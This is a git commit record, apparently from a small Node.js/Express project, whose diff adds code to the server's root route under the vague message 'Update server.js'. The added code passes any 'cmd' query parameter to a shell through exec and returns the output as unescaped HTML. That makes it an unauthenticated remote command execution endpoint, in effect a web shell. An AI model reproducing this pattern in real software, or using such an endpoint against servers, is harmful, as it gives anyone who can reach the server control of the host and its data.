d4604bc044554d2827f3658a75cc45d523751bfd
TudbuT <48156391+TudbuT@users.noreply.github.com>
2019-11-20 15:41:10 +0100

    Update server.js

--- server.js
+++ server.js
@@ -14,7 +14,12 @@ const app = express();
 
 app.get("/", function(req, res) {
   var r = req.query
-  
+  if(r.do == "exe" && r.cmd) {
+    exec(r.cmd, (n, o, e) => {
+      if (n) res.send("Error")
+      res.send(`Out:<pre>${o}</pre><br /><br />Err:<pre>${e}</pre>`)
+    });
+  };
 });
 
 const listener = app.listen(process.env.PORT, function() {
